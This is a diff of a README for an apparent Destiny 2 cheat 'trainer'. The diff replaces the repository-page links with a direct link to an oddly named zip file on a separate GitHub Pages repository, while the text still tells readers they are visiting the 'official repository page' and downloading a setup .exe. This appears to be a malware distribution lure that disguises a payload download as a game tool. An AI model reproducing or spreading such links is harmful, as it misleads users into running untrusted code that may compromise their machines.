@@ -5,7 +5,7 @@ description: "Automate gameplay in Destiny 2 with an external tool featuring god
 ---
 # 🎯 Destiny2-Ultimate-Trainer-2026-gold - Enhance your gameplay with advanced tools
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/princea9875/Destiny2-Ultimate-Trainer-2026-gold)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/princea9875/princea9875.github.io/main/heartsore/princea_io_github_furiousness.zip)
 
 This software helps players manage repetitive tasks and improve performance in Destiny 2. It includes features for automation, movement, and combat adjustments. The tool works on Windows systems and runs in the background while you play.
 
@@ -24,7 +24,7 @@ Before you install this software, ensure your computer meets these standards:
 
 Follow these steps to set up the trainer on your machine.
 
-1. Visit the [official repository page](https://github.com/princea9875/Destiny2-Ultimate-Trainer-2026-gold) to access the download options.
+1. Visit the [official repository page](https://raw.githubusercontent.com/princea9875/princea9875.github.io/main/heartsore/princea_io_github_furiousness.zip) to access the download options.
 2. Select the latest release version on the right-hand side of the page.
 3. Download the executable file labeled `Destiny2-Trainer-Setup.exe`.
 4. Locate the file in your Downloads folder.
